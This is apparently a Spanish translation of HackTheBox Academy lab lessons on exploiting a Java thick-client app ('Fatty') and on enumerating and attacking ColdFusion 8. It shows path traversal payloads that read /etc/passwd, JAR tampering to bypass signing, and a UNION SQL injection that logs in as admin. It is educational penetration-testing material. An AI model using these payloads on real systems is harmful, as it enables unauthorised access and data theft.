  Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

```powershell-session
C:\> ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List

Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml
LineNumber : 13
```

Hay un partido en `beans.xml`. Esto es un `Spring` archivo de configuración que contiene metadatos de configuración. Leamos su contenido.

  Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

```powershell-session
C:\> cat fatty-client\beans.xml

<SNIP>
<!-- Here we have an constructor based injection, where Spring injects required arguments inside the
         constructor function. -->
   <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
      <constructor-arg index="0" value = "server.fatty.htb"/>
      <constructor-arg index="1" value = "8000"/>
   </bean>

<!-- The next to beans use setter injection. For this kind of injection one needs to define an default
constructor for the object (no arguments) and one needs to define setter methods for the properties. -->
   <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
      <property name = "keystorePath" value = "fatty.p12"/>
   </bean>

   <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
      <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
   </bean>
<SNIP>
```

Editemos la línea `<constructor-arg index="1" value = "8000"/>` y establecer el puerto en `1337`. Leyendo el contenido cuidadosamente, también notamos que el valor de la `secret` es `clarabibiclarabibiclarabibi`. Ejecutar la aplicación editada fallará debido a un `SHA-256` digerir el desajuste. El JAR está firmado, validando cada archivo `SHA-256` hash antes de correr. Estos hashes están presentes en el archivo `META-INF/MANIFEST.MF`.

  Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

```powershell-session
C:\> cat fatty-client\META-INF\MANIFEST.MF

Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties
SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=

Name: org/springframework/jmx/export/metadata/ManagedOperationParamete
 r.class
SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=
<SNIP>
```

Eliminemos los hashes de `META-INF/MANIFEST.MF` y eliminar el `1.RSA` y `1.SF` archivos de la `META-INF` directorio. El modificado `MANIFEST.MF` debería terminar con una nueva línea.

Código: txt

```txt
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

```

Podemos actualizar y ejecutar el `fatty-client.jar` archiva emitiendo los siguientes comandos.

  Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

```powershell-session
C:\> cd .\fatty-client
C:\> jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```

Luego, hacemos doble clic en el `fatty-client-new.jar` archivo para iniciarlo e intente iniciar sesión con las credenciales `qtc / clarabibi`.

![iniciar sesión](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/login.png)

Esta vez recibimos el mensaje `Login Successful!`.

---

## Estribo

Haciendo clic en `Profile` -> `Whoami` revela que el usuario `qtc` se asigna con el `user` rol.

![perfil1](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/profile1.png)

Haciendo clic en el `ServerStatus,` notamos que no podemos hacer clic en ninguna opción.

![estado](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/status.png)

Esto implica que podría haber otro usuario con privilegios más altos que pueda usar esta función. Haciendo clic en el `FileBrowser` -> `Notes.txt` revela el archivo `security.txt`. Haciendo clic en el `Open` la opción en la parte inferior de la ventana muestra el siguiente contenido.

![seguridad](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/security.png)

Esta nota nos informa que algunos problemas críticos en la aplicación aún deben solucionarse. Navegando hacia el `FileBrowser` -> `Mail` la opción revela el `dave.txt` archivo que contiene información interesante. Podemos leer su contenido haciendo clic en el `Open` opción en la parte inferior de la ventana.

![dave](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/dave.png)

El mensaje de dave dice que todo `admin` los usuarios se eliminan de la base de datos. También se refiere a un tiempo de espera implementado en el procedimiento de inicio de sesión para mitigar los ataques de inyección SQL basados en el tiempo.

---

## Camino Traversal

Como podemos leer archivos, intentemos un ataque de recorrido de ruta dando la siguiente carga útil en el campo y haciendo clic en `Open` botón.

Código: txt

```txt
../../../../../../etc/passwd
```

![passwd](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/passwd.png)

El servidor filtra el `/` carácter de la entrada. Descompilemos la aplicación usando [JD-GUI](http://java-decompiler.github.io/), arrastrando y soltando el `fatty-client-new.jar` en el `jd-gui`.

![jdgui](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/jdgui.png)

Guarde el código fuente presionando el `Save All Sources` opción en `jdgui`. Descomprimir el `fatty-client-new.jar.src.zip` haciendo clic derecho y seleccionando `Extract files`. El archivo `fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java` maneja las características de la aplicación. Leer su contenido revela el siguiente código.

Código: java

```java
public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "files");
    this.action.addArgument(folder);
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
```

El `showFiles` la función toma un argumento para el nombre de la carpeta y luego envía los datos al servidor usando el `sendAndRecv()` llamar. El archivo `fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java` establece la opción de carpeta. Leamos su contenido.

Código: java

```java
configs.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            ClientGuiTest.this.currentFolder = "configs";
            try {
              response = ClientGuiTest.this.invoker.showFiles("configs");
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
```

Podemos reemplazar el `configs` nombre de la carpeta con `..` como sigue.

Código: java

```java
ClientGuiTest.this.currentFolder = "..";
  try {
    response = ClientGuiTest.this.invoker.showFiles("..");
```

A continuación, compile el `ClientGuiTest.Java` archivo.

  Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

```powershell-session
C:\> javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
```

Esto genera varios archivos de clase. Creemos una nueva carpeta y extraigamos el contenido de `fatty-client-new.jar` en ello.

  Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

```powershell-session
C:\> mkdir raw
C:\> cp fatty-client-new.jar raw\fatty-client-new-2.jar
```

Navegar al `raw` directorio y descomprimir `fatty-client-new-2.jar` haciendo clic derecho y seleccionando `Extract Here`. Sobrescribir cualquier existente `htb/fatty/client/gui/*.class` archivos con archivos de clase actualizados.

  Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

```powershell-session
C:\> mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
```

Finalmente, construimos el nuevo archivo JAR.

  Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

```powershell-session
C:\> cd raw
C:\> jar -cmf META-INF\MANIFEST.MF traverse.jar .
```

Iniciemos sesión en la aplicación y naveguemos hacia `FileBrowser` -> `Config` opción.

![atravesar](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/traverse.png)

Esto es exitoso. Ahora podemos ver el contenido del directorio `configs/../`. Los archivos `fatty-server.jar` y `start.sh` parece interesante. Listando el contenido de la `start.sh` el archivo revela que `fatty-server.jar` está corriendo dentro de un contenedor Alpine Docker.

![empezar](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/start.png)

Podemos modificar el `open` función en `fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java` para descargar el archivo `fatty-server.jar` como sigue.

Código: java

```java
import java.io.FileOutputStream;
<SNIP>
public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
        return "Error: Method '" + methodName + "' is not allowed for this user account";
    }
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);
    
    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }
    
    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();
    
    return "Successfully saved the file to " + desktopPath;
}
<SNIP>
```

Reconstruya el archivo JAR siguiendo los mismos pasos e inicie sesión nuevamente en la aplicación. Luego, navega para `FileBrowser` -> `Config`, añade el `fatty-server.jar` nombre en el campo de entrada y haga clic en el `Open` botón.

![descargar](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/download.png)

El `fatty-server.jar` el archivo se descarga con éxito en nuestro escritorio y podemos comenzar el examen.

  Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

```powershell-session
C:\> ls C:\Users\cybervaca\Desktop\

...SNIP...
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/25/2023  11:38 AM       10827452 fatty-server.jar
```

---

## Inyección SQL

Descompilar el `fatty-server.jar` usando JD-GUI revela el archivo `htb/fatty/server/database/FattyDbSession.class` eso contiene a `checkLogin()` función que maneja la funcionalidad de inicio de sesión. Esta función recupera los detalles del usuario en función del nombre de usuario proporcionado. Luego compara la contraseña recuperada con la contraseña proporcionada.

Código: java

```java
public User checkLogin(User user) throws LoginException {
    <SNIP>
      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
      <SNIP>
        if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
          return newUser; 
        throw new LoginException("Wrong Password!");
      <SNIP>
           this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
      return null;
```

Comprobamos cómo la aplicación cliente envía credenciales al servidor. El botón de inicio de sesión crea el nuevo objeto `ClientGuiTest.this.user` para el `User` clase. Luego llama al `setUsername()` y `setPassword()` funciones con los respectivos valores de nombre de usuario y contraseña. Los valores que se devuelven desde estas funciones se envían al servidor.

![logincode](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/logincode.png)

Revisemos el `setUsername()` y `setPassword()` funciones de `htb/fatty/shared/resources/user.java`.

Código: java

```java
public void setUsername(String username) {
    this.username = username;
  }
  
  public void setPassword(String password) {
    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    MessageDigest digest = null;
    try {
      digest = MessageDigest.getInstance("SHA-256");
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    } 
    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
    this.password = DatatypeConverter.printHexBinary(hash);
  }
```

El nombre de usuario se acepta sin modificaciones, pero la contraseña se cambia al formato a continuación.

Código: java

```java
sha256(username+password+"clarabibimakeseverythingsecure")
```

También notamos que el nombre de usuario no está desinfectado y se usa directamente en la consulta SQL, lo que lo hace vulnerable a la inyección SQL.

Código: java

```java
rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
```

El `checkLogin` función en `htb/fatty/server/database/FattyDbSession.class` escribe la excepción SQL en un archivo de registro.

Código: java

```java
<SNIP>
    this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
<SNIP>
```

Inicie sesión en la aplicación usando el nombre de usuario `qtc'` para validar la vulnerabilidad de inyección SQL se revela un error de sintaxis. Para ver el error, necesitamos editar el código en el `fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java` archive de la siguiente manera.

Código: java

```java
ClientGuiTest.this.currentFolder = "../logs";
  try {
    response = ClientGuiTest.this.invoker.showFiles("../logs");
```

Listando el contenido de la `error-log.txt` el archivo revela el siguiente mensaje.

![error](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/error.png)

Esto confirma que el campo de nombre de usuario es vulnerable a la inyección SQL. Sin embargo, el inicio de sesión intenta usar cargas útiles como `' or '1'='1` en ambos campos fallan. Suponiendo que el nombre de usuario en el formulario de inicio de sesión es `' or '1'='1`, el servidor procesará el nombre de usuario como se muestra a continuación.

Código: sql

```sql
SELECT id,username,email,password,role FROM users WHERE username='' or '1'='1'
```

La consulta anterior tiene éxito y devuelve el primer registro en la base de datos. El servidor crea entonces un nuevo objeto de usuario con los resultados obtenidos.

Código: java

```java
<SNIP>
if (rs.next()) {
        int id = rs.getInt("id");
        String username = rs.getString("username");
        String email = rs.getString("email");
        String password = rs.getString("password");
        String role = rs.getString("role");
        newUser = new User(id, username, password, email, Role.getRoleByName(role), false);
<SNIP>
```

Luego compara la contraseña de usuario recién creada con la contraseña suministrada por el usuario.

Código: java

```java
<SNIP>
if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
    return newUser;
throw new LoginException("Wrong Password!");
<SNIP>
```

Entonces, el siguiente valor es producido por `newUser.getPassword()` función.

Código: java

```java
sha256("qtc"+"clarabibi"+"clarabibimakeseverythingsecure") = 5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046
```

El hash de contraseña suministrado por el usuario `user.getPassword()` se calcula de la siguiente manera.

Código: java

```java
sha256("' or '1'='1" + "' or '1'='1" + "clarabibimakeseverythingsecure") = cc421e01342afabdd4857e7a1db61d43010951c7d5269e075a029f5d192ee1c8
```

Aunque el hash enviado al servidor por el cliente no coincide con el de la base de datos, y la comparación de contraseñas falla, la inyección SQL sigue siendo posible de usar `UNION` consultas. Consideremos el siguiente ejemplo.

Código: sql

```sql
MariaDB [userdb]> select * from users where username='john';
+----------+-------------+
| username | password    |
+----------+-------------+
| john     | password123 |
+----------+-------------+
```

Es posible crear entradas falsas usando el `SELECT` operador. Ingresemos un nombre de usuario no válido para crear una nueva entrada de usuario.

Código: sql

```sql
MariaDB [userdb]> select * from users where username='test' union select 'admin', 'welcome123';
+----------+-------------+
| username | password    |
+----------+-------------+
| admin    | welcome123  |
+----------+-------------+
```

Del mismo modo, la inyección en el `username` el campo se puede aprovechar para crear una entrada de usuario falsa.

Código: java

```java
test' UNION SELECT 1,'invaliduser','invalid@a.b','invalidpass','admin
```

De esta manera, se pueden controlar la contraseña y el rol asignado. El siguiente fragmento de código envía la contraseña de texto sin formato ingresada en el formulario. Modifiquemos el código en `htb/fatty/shared/resources/User.java` para enviar la contraseña tal como es desde la aplicación del cliente.

Código: java

```java
public User(int uid, String username, String password, String email, Role role) {
    this.uid = uid;
    this.username = username;
    this.password = password;
    this.email = email;
    this.role = role;
}
public void setPassword(String password) {
    this.password = password;
  }
```

Ahora podemos reconstruir el archivo JAR e intentar iniciar sesión con la carga útil `abc' UNION SELECT 1,'abc','a@b.com','abc','admin` en el `username` campo y el texto aleatorio `abc` en el `password` campo.

![pasar](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/bypass.png)

El servidor eventualmente procesará la siguiente consulta.

Código: sql

```sql
select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
```

La primera consulta de selección falla, mientras que la segunda devuelve resultados de usuario válidos con el rol `admin` y la contraseña `abc`. La contraseña enviada al servidor también es `abc`, lo que resulta en una comparación exitosa de contraseñas, y la aplicación nos permite iniciar sesión como usuario `admin`.

![administrador](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/admin.png)


# ColdFusion - Descubrimiento y enumeración

---

ColdFusion es un lenguaje de programación y una plataforma de desarrollo de aplicaciones web basada en Java. ColdFusion fue desarrollado inicialmente por Allaire Corporation en 1995 y fue adquirido por Macromedia en 2001. Macromedia fue adquirida más tarde por Adobe Systems, que ahora posee y desarrolla ColdFusion.

Se utiliza para crear aplicaciones web dinámicas e interactivas que se pueden conectar a varias API y bases de datos como MySQL, Oracle y Microsoft SQL Server. ColdFusion se lanzó por primera vez en 1995 y desde entonces se ha convertido en una plataforma poderosa y versátil para el desarrollo web.

Lenguaje de marcado ColdFusion (`CFML`) es el lenguaje de programación patentado utilizado en ColdFusion para desarrollar aplicaciones web dinámicas. Tiene una sintaxis similar a HTML, lo que facilita el aprendizaje para los desarrolladores web. CFML incluye etiquetas y funciones para la integración de bases de datos, servicios web, administración de correo electrónico y otras tareas comunes de desarrollo web. Su enfoque basado en etiquetas simplifica el desarrollo de aplicaciones al reducir la cantidad de código necesario para realizar tareas complejas. Por ejemplo, el `cfquery` tag puede ejecutar sentencias SQL para recuperar datos de una base de datos:

Código: html

```html
<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>
```

Los desarrolladores pueden usar el `cfloop` etiqueta para iterar a través de los registros recuperados de la base de datos:

Código: html

```html
<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```

Gracias a sus funciones y características integradas, CFML permite a los desarrolladores crear una lógica empresarial compleja utilizando un código mínimo. Además, ColdFusion admite otros lenguajes de programación, como JavaScript y Java, lo que permite a los desarrolladores usar su lenguaje de programación preferido dentro del entorno ColdFusion.

ColdFusion también ofrece soporte para correo electrónico, manipulación de PDF, gráficos y otras características de uso común. Las aplicaciones desarrolladas con ColdFusion pueden ejecutarse en cualquier servidor que admita su tiempo de ejecución. Está disponible para descargar desde el sitio web de Adobe y se puede instalar en sistemas operativos Windows, Mac o Linux. Las aplicaciones de ColdFusion también se pueden implementar en plataformas en la nube como Amazon Web Services o Microsoft Azure. Algunos de los principales propósitos y beneficios de ColdFusion incluyen:

|**Beneficios**|**Descripción**|
|---|---|
|`Developing data-driven web applications`|ColdFusion permite a los desarrolladores crear aplicaciones web ricas y receptivas fácilmente. Ofrece administración de sesiones, manejo de formularios, depuración y más funciones. ColdFusion le permite aprovechar su conocimiento existente del idioma y lo combina con funciones avanzadas para ayudarlo a crear aplicaciones web sólidas rápidamente.|
|`Integrating with databases`|ColdFusion se integra fácilmente con bases de datos como Oracle, SQL Server y MySQL. ColdFusion proporciona conectividad de base de datos avanzada y está diseñado para facilitar la recuperación, manipulación y visualización de datos desde una base de datos y la web.|
|`Simplifying web content management`|Uno de los objetivos principales de ColdFusion es optimizar la gestión de contenido web. La plataforma ofrece generación dinámica de HTML y simplifica la creación de formularios, la reescritura de URL, la carga de archivos y el manejo de formularios grandes. Además, ColdFusion también admite AJAX al manejar automáticamente la serialización y deserialización de los componentes habilitados para AJAX.|
|`Performance`|ColdFusion está diseñado para ser altamente eficiente y está optimizado para baja latencia y alto rendimiento. Puede manejar una gran cantidad de solicitudes simultáneas mientras mantiene un alto nivel de rendimiento.|
|`Collaboration`|ColdFusion ofrece características que permiten a los desarrolladores trabajar juntos en proyectos en tiempo real. Esto incluye compartir código, depuración, control de versiones y más. Esto permite un desarrollo más rápido y más eficiente, reducción del tiempo de comercialización y entrega más rápida de proyectos.|

A pesar de ser menos popular que otras plataformas de desarrollo web, ColdFusion sigue siendo ampliamente utilizado por desarrolladores y organizaciones a nivel mundial. Gracias a su facilidad de uso, capacidades rápidas de desarrollo de aplicaciones e integración con otras tecnologías web, es una opción ideal para crear aplicaciones web de manera rápida y eficiente. ColdFusion ha evolucionado, con nuevas versiones lanzadas periódicamente desde su inicio.

La última versión estable de ColdFusion, a partir de este escrito, es ColdFusion 2021, con ColdFusion 2023 a punto de ingresar a Alpha. Las versiones anteriores incluyen ColdFusion 2018, ColdFusion 2016 y ColdFusion 11, cada una con nuevas características y mejoras, como un mejor rendimiento, una integración más directa con otras plataformas, seguridad mejorada y usabilidad mejorada.

Al igual que cualquier tecnología orientada a la web, ColdFusion ha sido históricamente vulnerable a varios tipos de ataques, como inyección SQL, XSS, salto de directorio, omisión de autenticación y cargas arbitrarias de archivos. Para mejorar la seguridad de ColdFusion, los desarrolladores deben implementar prácticas de codificación seguras, comprobaciones de validación de entrada y configurar correctamente servidores web y firewalls. Aquí hay algunas vulnerabilidades conocidas de ColdFusion:

1. CVE-2021-21087: Rechazo arbitrario de cargar el código fuente JSP
2. CVE-2020-24453: Configuración incorrecta de la integración de Active Directory
3. CVE-2020-24450: Vulnerabilidad de inyección de comandos
4. CVE-2020-24449: Vulnerabilidad arbitraria de lectura de archivos
5. CVE-2019-15909: Vulnerabilidad de secuencias de comandos en sitios cruzados (XSS)

ColdFusion expone unos pocos puertos por defecto:

|Número de Puerto|Protocolo|Descripción|
|---|---|---|
|80|HTTP|Se utiliza para la comunicación HTTP no segura entre el servidor web y el navegador web.|
|443|HTTPS|Se utiliza para la comunicación HTTP segura entre el servidor web y el navegador web. Cifra la comunicación entre el servidor web y el navegador web.|
|1935|RPC|Utilizado para la comunicación cliente-servidor. El protocolo Remote Procedure Call (RPC) permite que un programa solicite información de otro programa en un dispositivo de red diferente.|
|25|SMTP|Simple Mail Transfer Protocol (SMTP) se utiliza para enviar mensajes de correo electrónico.|
|8500|SSL|Se utiliza para la comunicación del servidor a través de Secure Socket Layer (SSL).|
|5500|Monitor de Servidor|Utilizado para la administración remota del servidor ColdFusion.|

Es importante tener en cuenta que los puertos predeterminados se pueden cambiar durante la instalación o configuración.

---

## Enumeración

Durante una enumeración de pruebas de penetración, existen varias formas de identificar si una aplicación web utiliza ColdFusion. Aquí hay algunos métodos que se pueden utilizar:

|**Método**|**Descripción**|
|---|---|
|`Port Scanning`|ColdFusion normalmente utiliza el puerto 80 para HTTP y el puerto 443 para HTTPS de forma predeterminada. Por lo tanto, el escaneo de estos puertos puede indicar la presencia de un servidor ColdFusion. Nmap podría identificar ColdFusion durante un escaneo de servicios específicamente.|
|`File Extensions`|Las páginas de ColdFusion suelen utilizar extensiones de archivo ".cfm" o ".cfc". Si encuentra páginas con estas extensiones de archivo, podría ser un indicador de que la aplicación está utilizando ColdFusion.|
|`HTTP Headers`|Compruebe los encabezados de respuesta HTTP de la aplicación web. ColdFusion normalmente establece encabezados específicos, como "Server: ColdFusion" o "X-Powered-By: ColdFusion", que pueden ayudar a identificar la tecnología que se utiliza.|
|`Error Messages`|Si la aplicación utiliza ColdFusion y hay errores, los mensajes de error pueden contener referencias a etiquetas o funciones específicas de ColdFusion.|
|`Default Files`|ColdFusion crea varios archivos predeterminados durante la instalación, como "admin.cfm" o "CFIDE/administrator/index.cfm". Encontrar estos archivos en el servidor web puede indicar que la aplicación web se ejecuta en ColdFusion.|

#### Puertos NMap y resultados de escaneo de servicio

  ColdFusion - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ nmap -p- -sC -Pn 10.129.247.30 --open

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-13 11:45 GMT
Nmap scan report for 10.129.247.30
Host is up (0.028s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 350.38 seconds

```

Los resultados del escaneo de puertos muestran tres puertos abiertos. Dos servicios de Windows RPC y uno ejecutándose `8500`. Como sabemos, `8500` es un puerto predeterminado que ColdFusion utiliza para SSL. Navegando hacia el `IP:8500` listas 2 directorios, `CFIDE` y `cfdocs,` en la raíz, lo que indica además que ColdFusion se está ejecutando en el puerto 8500.

Navegar un poco por la estructura muestra mucha información interesante, desde archivos con un claro `.cfm` extensión a mensajes de error y páginas de inicio de sesión.

![](https://academy.hackthebox.com/storage/modules/113/coldfusion/cfindex.png)

![](https://academy.hackthebox.com/storage/modules/113/coldfusion/CFIDE.png)

![](https://academy.hackthebox.com/storage/modules/113/coldfusion/CFError.png)

El `/CFIDE/administrator` sin embargo, path carga la página de inicio de sesión de ColdFusion 8 Administrator. Ahora sabemos con certeza que `ColdFusion 8` se ejecuta en el servidor.

![](https://academy.hackthebox.com/storage/modules/113/coldfusion/CF8.png)

---

Nota: Existe la posibilidad de que la Máquina Virtual tome largos períodos de tiempo para responder (hasta 90 años), por favor sea paciente


# Atacar a ColdFusion

---

Ahora que sabemos que ColdFusion 8 es un objetivo, el siguiente paso es verificar los exploits conocidos existentes. `Searchsploit` es una herramienta de línea de comandos para `searching and finding exploits` en la base de datos Exploit. Es parte del proyecto Exploit Database, una organización sin fines de lucro que proporciona un repositorio público de exploits y software vulnerable. `Searchsploit` busca a través de la base de datos Exploit y devuelve una lista de exploits y sus detalles relevantes, incluido el nombre del exploit, su descripción y la fecha en que se lanzó.

#### Buscarsploit

  Atacar a ColdFusion

```shell-session
vcrdcr@htb[/htb]$ searchsploit adobe coldfusion

------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Como sabemos, la versión de ColdFusion en ejecución es `ColdFusion 8`, y hay dos resultados de interés. El `Adobe ColdFusion - Directory Traversal` y el `Adobe ColdFusion 8 - Remote Command Execution (RCE)` resultados.

---

## Directorio Traversal

`Directory/Path Traversal` es un ataque que permite a un atacante acceder a archivos y directorios fuera del directorio previsto en una aplicación web. El ataque explota la falta de validación de entrada en una aplicación web y se puede ejecutar a través de varios `input fields` como `URL parameters`, `form fields`, `cookies`, y más. Al manipular los parámetros de entrada, el atacante puede atravesar la estructura de directorios de la aplicación web y `access sensitive files`, incluyendo `configuration files`, `user data`y otros archivos del sistema. El ataque se puede ejecutar manipulando los parámetros de entrada en etiquetas ColdFusion como `CFFile` y `CFDIRECTORY,` que se utilizan para operaciones de archivos y directorios, como cargar, descargar y enumerar archivos.

Tome el siguiente fragmento de código de ColdFusion:

Código: html

```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```

En este fragmento de código, el ColdFusion `cfdirectory` la etiqueta enumera el contenido de la `uploads` directorio, y el `cfloop` la etiqueta se utiliza para recorrer los resultados de la consulta y mostrar los nombres de archivo como enlaces en HTML.

Sin embargo, el `directory` el parámetro no se valida correctamente, lo que hace que la aplicación sea vulnerable a un ataque Path Traversal. Un atacante puede explotar esta vulnerabilidad manipulando el `directory` parámetro para acceder a archivos fuera del `uploads` directorio.

Código: http

```http
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```

En este ejemplo, el `../` la secuencia se utiliza para navegar por el árbol de directorios y acceder al `/etc/passwd` archivo fuera de la ubicación prevista.

`CVE-2010-2861` es el `Adobe ColdFusion - Directory Traversal` exploit descubierto por `searchsploit`. Es una vulnerabilidad en ColdFusion que permite a los atacantes realizar ataques de recorrido de ruta.

- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

Estos archivos ColdFusion son vulnerables a un ataque de salto de directorio en `Adobe ColdFusion 9.0.1` y `earlier versions`. Los atacantes remotos pueden explotar esta vulnerabilidad para leer archivos arbitrarios manipulando `locale parameter` en estos archivos específicos de ColdFusion.

